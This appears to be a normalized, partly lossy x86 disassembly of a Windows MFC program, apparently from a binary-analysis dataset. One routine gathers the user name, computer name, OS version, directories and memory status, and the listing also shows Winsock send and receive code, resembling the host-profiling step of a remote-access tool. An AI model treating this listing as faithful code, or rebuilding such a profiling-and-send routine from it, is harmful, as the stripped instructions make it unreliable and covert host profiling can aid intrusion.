jne r-xdata
mov esi [ malloc@IAT ]
mov ecx [ edx + 0x24 ]
mov esi [ malloc@IAT ]
push ecx
call esi
mov edx [ rw-data ]
mov [ edx + 0x84 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x24 ]
mov edx [ eax + 0x7c ]
mov eax [ eax + 0x84 ]
push ecx
push edx
push eax
call sub_40c9f0
mov edx [ rw-data ]
mov eax [ rw-data ]
add esp 0x10
mov ecx [ edx + 0x24 ]
mov [ rw-data ] ecx
jmp r-xdata
cmp eax 0xb
jne r-xdata
mov edx [ edx + 0x24 ]
add edx 0x600
push edx
call esi
mov ecx [ rw-data ]
lea edx [ esp + 0x74 ]
push edx
mov [ ecx + 0x84 ] eax
lea eax [ esp + 0x880 ]
push eax
mov eax [ rw-data ]
mov ecx [ eax + 0x24 ]
mov edx [ eax + 0x7c ]
push ecx
push edx
call sub_4079a0
mov ecx [ rw-data ]
mov edx [ ecx + 0x84 ]
push edx
lea edx [ esp + 0x88 ]
push edx
lea edx [ esp + 0x894 ]
push edx
push eax
mov eax [ ecx + 0x24 ]
mov ecx [ ecx + 0x7c ]
push eax
push ecx
call sub_407ac0
add esp 0x2c
mov [ rw-data ] eax
jmp r-xdata
cmp eax 0xa
jne r-xdata
cmp eax 0xc
jne r-xdata
mov edx [ edx + 0x24 ]
add edx 0x600
push edx
mov [ esp + 0x18 ] edx
call esi
mov edx [ rw-data ]
mov [ edx + 0x84 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x24 ]
push ecx
call esi
mov esi eax
mov eax [ rw-data ]
mov edx [ eax + 0x24 ]
mov eax [ eax + 0x7c ]
push edx
push eax
push esi
call sub_40c9f0
mov ecx [ rw-data ]
lea edx [ esp + 0x84 ]
lea eax [ esp + 0x88c ]
push edx
mov ebx [ ecx + 0x24 ]
push eax
push ebx
push esi
mov [ esp + 0x34 ] 0x0
call sub_4079a0
lea ecx [ esp + 0x94 ]
mov ebp eax
push ecx
push ebp
push ebx
push esi
call sub_407a20
mov edi eax
mov eax [ esp + 0x48 ]
add esp 0x34
cmp edi eax
jae r-xdata
mov edx [ rw-data ]
cmp eax 0xd
jne r-xdata
mov edx [ edx + 0x24 ]
lea edx [ edx + edx * 2 + 0x4 ]
push edx
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x84 ] eax
mov eax [ rw-data ]
mov edx [ eax + 0x84 ]
mov ecx [ eax + 0x24 ]
push edx
mov edx [ eax + 0x7c ]
push ecx
push edx
call sub_408f10
add esp 0x10
mov [ rw-data ] eax
jmp r-xdata
push esi
call [ free@IAT ]
mov edx [ rw-data ]
mov ebx [ esp + 0x1484 ]
mov ebp [ recv@IAT ]
add esp 0x4
jmp r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x70 ]
mov eax [ edx + 0x84 ]
lea edx [ esp + 0x878 ]
push eax
push ecx
push edx
push ebp
push ebx
push esi
call sub_407ac0
mov [ rw-data ] eax
push eax
mov eax [ rw-data ]
mov ecx [ eax + 0x84 ]
push ecx
push esi
call sub_40c9f0
mov eax [ esp + 0x34 ]
mov edx [ rw-data ]
inc eax
mov [ esp + 0x38 ] edx
mov edx [ rw-data ]
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x94 ]
lea ecx [ esp + 0x89c ]
push eax
mov eax [ edx + 0x24 ]
push ecx
push eax
push esi
mov ebx edi
call sub_4079a0
lea ecx [ esp + 0xa4 ]
mov ebp eax
push ecx
push ebp
push edi
push esi
call sub_407a20
mov edi eax
mov eax [ esp + 0x58 ]
add esp 0x44
cmp edi eax
jb r-xdata
mov ecx 0x14
xor eax eax
lea edi [ esp + 0x1c ]
[ edi ]
stosb [ edi ]
mov eax [ rw-data ]
mov ecx [ edx + 0x24 ]
push eax
mov eax [ edx + 0x28 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx [ edx ]
push eax
mov eax [ esp + 0x1c ]
push ecx
push edx
push eax
lea ecx [ esp + 0x34 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x3c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x3c ]
[ edi ]
not ecx
dec ecx
push ecx
push edx
push ebx
call sub_40c550
mov ecx 0x14
xor eax eax
lea edi [ esp + 0x48 ]
add esp 0x2c
[ edi ]
stosb [ edi ]
push 0x0
lea eax [ esp + 0x20 ]
push 0x51
push eax
push ebx
call ebp
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + eax + 0x1c ] 0x0
push ecx
mov eax [ edx + 0x84 ]
push eax
push ebx
call sub_40c550
mov ecx [ rw-data ]
mov edx [ ecx + 0x84 ]
push edx
call [ free@IAT ]
mov ecx 0x14
xor eax eax
lea edi [ esp + 0x2c ]
add esp 0x10
[ edi ]
stosb [ edi ]
push 0x0
lea eax [ esp + 0x20 ]
push 0x51
push eax
push ebx
call ebp
mov edx [ rw-data ]
mov esi [ esp + 0x18 ]
mov [ esp + eax + 0x1c ] 0x0
mov edx [ edx + 0x24 ]
lea eax [ edx + edx * 2 + 0x4 ]
push eax
call esi
mov ecx [ rw-data ]
mov edi eax
mov eax [ ecx + 0x24 ]
lea edx [ eax + eax * 2 + 0x4 ]
push edx
call esi
mov ecx [ rw-data ]
push edi
mov [ ecx + 0x84 ] eax
mov eax [ rw-data ]
mov edx [ eax + 0x24 ]
mov eax [ eax + 0x7c ]
push edx
push eax
call sub_408f10
lea ecx [ esp + 0x84 ]
lea edx [ esp + 0x88c ]
mov esi eax
push ecx
push edx
push esi
push edi
call sub_4079a0
mov ecx [ rw-data ]
mov edx [ ecx + 0x84 ]
lea ecx [ esp + 0x94 ]
push edx
lea edx [ esp + 0x8a0 ]
push ecx
push edx
push eax
push esi
push edi
call sub_407ac0
push edi
mov [ rw-data ] eax
call [ free@IAT ]
add esp 0x40
sub_40c550
sub esp 0x30
push ebx
push ebp
push esi
push edi
call [ WSACreateEvent@IAT ]
xor ecx ecx
mov edx [ esp + 0x4c ]
mov [ esp + 0x2c ] ecx
mov esi [ esp + 0x44 ]
mov [ esp + 0x30 ] ecx
mov edi [ WSAWaitForMultipleEvents@IAT ]
mov [ esp + 0x34 ] ecx
mov ebx [ WSAResetEvent@IAT ]
mov ebp [ WSAGetOverlappedResult@IAT ]
mov [ esp + 0x38 ] ecx
mov [ esp + 0x3c ] ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x48 ]
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] eax
push 0x0
push 0xffffffff
lea ecx [ esp + 0x2c ]
push 0x0
push ecx
push 0x1
call edi
mov edx [ esp + 0x24 ]
push edx
call ebx
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
push eax
push 0x0
lea edx [ esp + 0x34 ]
push ecx
push edx
push esi
call ebp
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
sub ecx eax
mov [ esp + 0x1c ] ecx
je r-xdata
call [ WSAGetLastError@IAT ]
mov eax [ esp + 0x14 ]
push eax
call [ WSACloseEvent@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x30
retn
add [ esp + 0x20 ] eax
jmp r-xdata
lea ecx [ esp + 0x2c ]
push 0x0
push ecx
lea edx [ esp + 0x18 ]
push 0x0
push edx
lea eax [ esp + 0x2c ]
push 0x1
push eax
push esi
call [ WSASend@IAT ]
cmp eax 0xffffffff
jne r-xdata
sub_40c630
sub esp 0x18
push ebx
push ebp
push esi
mov esi [ WSAEnumProtocolsA@IAT ]
lea eax [ esp + 0xc ]
push edi
xor ebx ebx
push eax
push ebx
push ebx
mov [ esp + 0x1c ] ebx
call esi
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ malloc@IAT ]
mov edi eax
add esp 0x4
cmp edi ebx
mov [ esp + 0x1c ] edi
jne r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2747
je r-xdata
lea edx [ esp + 0x10 ]
push edx
push edi
push ebx
call esi
mov ecx eax
cmp ecx 0xffffffff
mov [ esp + 0x24 ] ecx
jne r-xdata
push 0x2747
call [ WSASetLastError@IAT ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x18
retn
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x18
retn
mov ebp [ esp + 0x34 ]
cmp ecx ebx
mov esi edi
mov [ esp + 0x34 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] ebx
jle r-xdata
push edi
call [ free@IAT ]
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
push edi
call [ free@IAT ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
add esp 0x4
mov [ eax ] ecx
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov eax [ esp + 0x2c ]
mov ebx [ esp + 0x30 ]
mov edx eax
and edx 0x1
mov [ esp + 0x20 ] edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x1
je r-xdata
test [ esi ] 0x1
je r-xdata
test al 0x2
je r-xdata
test [ esi ] 0x1
jne r-xdata
mov edx [ esp + 0x14 ]
add esi 0x174
inc edx
cmp edx ecx
mov [ esp + 0x14 ] edx
jl r-xdata
test bl 0x2
je r-xdata
test [ esi ] 0x2
je r-xdata
mov edx [ esp + 0x20 ]
test al 0x4
je r-xdata
test [ esi ] 0x2
jne r-xdata
test bl 0x4
je r-xdata
test [ esi ] 0x4
je r-xdata
test al 0x8
je r-xdata
test [ esi ] 0x4
jne r-xdata
test bl 0x8
je r-xdata
test [ esi ] 0x8
je r-xdata
test al 0x10
je r-xdata
test [ esi ] 0x8
jne r-xdata
test bl 0x10
je r-xdata
test [ esi ] 0x10
je r-xdata
test al 0x20
je r-xdata
test [ esi ] 0x10
jne r-xdata
test bl 0x20
je r-xdata
test [ esi ] 0x20
je r-xdata
test al 0x40
je r-xdata
test [ esi ] 0x20
jne r-xdata
test bl 0x40
je r-xdata
test [ esi ] 0x40
je r-xdata
test al 0x80
je r-xdata
test [ esi ] 0x40
jne r-xdata
test bl 0x80
je r-xdata
test [ esi ] 0x80
je r-xdata
test ah 0x1
je r-xdata
test [ esi ] 0x80
jne r-xdata
test bh 0x1
je r-xdata
mov edx [ esi ]
test dh 0x1
je r-xdata
test ah 0x2
je r-xdata
mov edx [ esi ]
test dh 0x1
jne r-xdata
test bh 0x2
je r-xdata
mov edx [ esi ]
test dh 0x2
je r-xdata
test ah 0x4
je r-xdata
mov edx [ esi ]
test dh 0x2
jne r-xdata
test bh 0x4
je r-xdata
mov edx [ esi ]
test dh 0x4
je r-xdata
test ah 0x10
je r-xdata
mov edx [ esi ]
test dh 0x4
jne r-xdata
test bh 0x10
je r-xdata
mov edx [ esi ]
test dh 0x10
je r-xdata
test ah 0x20
je r-xdata
mov edx [ esi ]
test dh 0x10
jne r-xdata
test bh 0x20
je r-xdata
mov edx [ esi ]
test dh 0x20
je r-xdata
test ah 0x80
je r-xdata
mov edx [ esi ]
test dh 0x20
jne r-xdata
test bh 0x80
je r-xdata
mov edx [ esi ]
test dh 0x80
je r-xdata
test eax 0x10000
je r-xdata
mov edx [ esi ]
test dh 0x80
jne r-xdata
test ebx 0x10000
je r-xdata
test [ esi ] 0x10000
je r-xdata
test eax 0x20000
je r-xdata
test [ esi ] 0x10000
jne r-xdata
test ebx 0x20000
je r-xdata
test [ esi ] 0x20000
je r-xdata
test eax 0x40000
je r-xdata
test [ esi ] 0x20000
jne r-xdata
test ebx 0x40000
je r-xdata
test [ esi ] 0x40000
je r-xdata
mov edx [ esp + 0x34 ]
mov edi [ esp + 0x38 ]
add edx 0x174
mov ecx [ edi ]
mov eax edx
cmp eax ecx
mov [ esp + 0x34 ] edx
ja r-xdata
test [ esi ] 0x40000
jne r-xdata
push 0x2747
call [ WSASetLastError@IAT ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x10 ]
push edx
mov [ edi ] ecx
call [ free@IAT ]
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov eax [ esp + 0x18 ]
push 0x174
inc eax
push esi
push ebp
mov [ esp + 0x24 ] eax
call sub_40c9f0
add esp 0xc
mov edi rw-data
lea eax [ esi + 0x74 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x24 ]
mov edi [ esp + 0x1c ]
add ebp 0x174
mov eax [ esp + 0x3c ]
push 0x174
push esi
push eax
call sub_40c9f0
add esp 0xc
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ edi + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ edi ]
jne r-xdata
sub_40c9f0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov ecx [ ebp + 0x10 ]
shr ecx 0x2
shl ecx 0x2
mov [ ebp - 0x4 ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
sub ecx eax
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0xc ]
add esi eax
mov edi [ ebp + 0x8 ]
add edi eax
[ edi ] [ esi ]
sub_40ca30
push 0x58
call [ malloc@IAT ]
mov edx eax
mov eax [ esp + 0x8 ]
add esp 0x4
test edx edx
mov [ eax + 0x54 ] edx
je r-xdata
xor eax eax
retn
push esi
push edi
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov [ edx + 0x54 ] 0x0
pop esi
retn
sub_40ca80
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
pop esi
retn
push edi
mov edi [ free@IAT ]
mov ecx [ eax + 0x54 ]
push eax
mov [ esi + 0x54 ] ecx
call edi
mov eax [ esi + 0x54 ]
add esp 0x4
test eax eax
jne r-xdata
pop edi
sub_40cab0
push 0xffffffff
push sub_40e624
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x8 ]
mov [ esp + 0x8 ] esi
lea ecx [ esi + 0x9c ]
call Ordinal_MFC42_540
lea ecx [ esi + 0xa0 ]
mov [ esp + 0x14 ] 0x0
call Ordinal_MFC42_540
lea ecx [ esi + 0xa4 ]
mov [ esp + 0x14 ] 0x1
call Ordinal_MFC42_540
lea ecx [ esi + 0xa8 ]
mov [ esp + 0x14 ] 0x2
call Ordinal_MFC42_540
lea ecx [ esi + 0xcc ]
mov [ esp + 0x14 ] 0x3
call Ordinal_MFC42_540
lea ecx [ esi + 0xd0 ]
mov [ esp + 0x14 ] 0x4
call Ordinal_MFC42_540
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x14 ] 0x5
call Ordinal_MFC42_540
mov ecx [ esp + 0xc ]
mov [ edi ] r--data
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40cb80
push 0xffffffff
push sub_40e684
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
lea esi [ ecx + 0x8 ]
mov [ ecx ] r--data
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x10 ] 0x5
call Ordinal_MFC42_800
lea ecx [ esi + 0xd0 ]
mov [ esp + 0x10 ] 0x4
call Ordinal_MFC42_800
lea ecx [ esi + 0xcc ]
mov [ esp + 0x10 ] 0x3
call Ordinal_MFC42_800
lea ecx [ esi + 0xa8 ]
mov [ esp + 0x10 ] 0x2
call Ordinal_MFC42_800
lea ecx [ esi + 0xa4 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esi + 0xa0 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esi + 0x9c ]
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40cc30
sub esp 0x43c
push ebx
mov ebx ecx
push ebp
push esi
lea eax [ ebx + 0x8 ]
push edi
push eax
mov [ eax ] 0x9c
call [ GetVersionExA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x4c ]
[ edi ]
not ecx
sub edi ecx
mov ebp 0x400
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x4c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov [ esp + 0x10 ] ebp
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
call [ GetUserNameA@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x4c ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x10 ] ebp
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x4c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
call [ GetComputerNameA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x4c ]
lea ecx [ ebx + 0xa4 ]
push eax
push rw-data
push ecx
call Ordinal_MFC42_2818
add esp 0xc
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x4c ]
[ edi ]
not ecx
sub edi ecx
push ebp
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x14 ] ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x50 ]
push ecx
call [ GetSystemDirectoryA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x4c ]
lea ecx [ ebx + 0xb0 ]
push eax
push rw-data
push ecx
call Ordinal_MFC42_2818
add esp 0xc
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x4c ]
[ edi ]
not ecx
sub edi ecx
push ebp
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x14 ] ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x50 ]
push ecx
call [ GetWindowsDirectoryA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x4c ]
lea eax [ ebx + 0xac ]
push edx
push rw-data
push eax
call Ordinal_MFC42_2818
add esp 0xc
lea eax [ ebx + 0xb4 ]
push eax
mov [ eax ] 0x20
call [ GlobalMemoryStatus@IAT ]
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4c ]
lea eax [ ebx + 0xa8 ]
push edx
push rw-data
push eax
call Ordinal_MFC42_2818
add esp 0xc
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x43c
retn
push rw-data
push edi
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
call [ FreeLibrary@IAT ]
push 0x0
lea ecx [ esp + 0x30 ]
push 0x20
push ecx
push 0x3
call esi
test eax eax
jne r-xdata
push 0x0
lea eax [ ebx + 0xe0 ]
push 0x138
push eax
push 0x2
call esi
test eax eax
jne r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x30 ]
mov [ esp + 0x14 ] edx
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x14 ]
push ecx
push edx
mov [ esp + 0x20 ] eax
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
call [ FileTimeToSystemTime@IAT ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x26 ]
mov ecx [ esp + 0x24 ]
and edx 0xffff
and eax 0xffff
push edx
mov edx [ esp + 0x26 ]
and ecx 0xffff
push eax
mov eax [ esp + 0x26 ]
push ecx
mov ecx [ esp + 0x28 ]
and edx 0xffff
and eax 0xffff
push edx
and ecx 0xffff
push eax
push ecx
lea edx [ ebx + 0xdc ]
push rw-data
push edx
call Ordinal_MFC42_2818
add esp 0x20
mov [ ebx + 0x23c ] 0x0
mov [ ebx + 0x23c ] 0x1
jmp r-xdata
push 0x0
add ebx 0x218
push 0x24
push ebx
push 0x15
call esi
sub_40d2c0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_40d2ef
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_40d357
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_40d36f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_40d3e3
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_40d44d
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x14
mov esi [ ebp + 0x8 ]
mov ecx esi
call [ ebp + 0x14 ]
add esi [ ebp + 0xc ]
mov [ ebp + 0x8 ] esi
inc [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40d641
cmp [ rw-data ] ebx
jne r-xdata
call sub_40d62c
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40d63e
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_40d69c
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40d6b4
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401700
push esi
mov esi ecx
call sub_401720
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401dd4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0x3
jl r-xdata
mov eax r-xdata
retn
mov eax r-xdata
retn
sub_401e92
mov ecx [ ebp - 0x3c ]
mov eax r-xdata
mov [ ebp - 0x44 ] ecx
retn
sub_4022a4
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x24 ]
cmp eax 0x3
jl r-xdata
mov eax r-xdata
retn
mov eax r-xdata
retn
sub_40262a
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x14 ]
cmp eax 0x3
jl r-xdata
mov eax r-xdata
retn
mov eax sub_40263e
retn
sub_40263e
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1567
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40299e
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x4c ] eax
mov eax r-xdata
retn
sub_4031f0
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_825
pop ecx
retn 0x4
sub_403200
mov ecx [ ecx ]
mov eax [ esp + 0x8 ]
sub ecx eax
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x8
sub_4032b0
push esi
mov esi ecx
call sub_4032d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_405de0
push esi
mov esi ecx
call sub_405e00
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call GdipFree
sub_405e00
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call GdipDisposeImage
retn
sub_4072bb
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x24 ] edx
call sub_403350
mov eax sub_4072cf
retn
sub_40736d
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
call sub_403350
mov eax sub_407381
retn
sub_407381
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1567
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_407457
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0x18 ]
call sub_403350
mov eax r-xdata
retn
sub_407509
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
call sub_403350
mov eax r-xdata
retn
sub_407c50
push esi
mov esi ecx
call sub_407c70
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_407c70
mov [ ecx ] r--data
retn
sub_407c80
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
retn 0x4
sub_408970
push esi
mov esi ecx
call sub_408a30
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_409020
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_409030
mov eax r--data
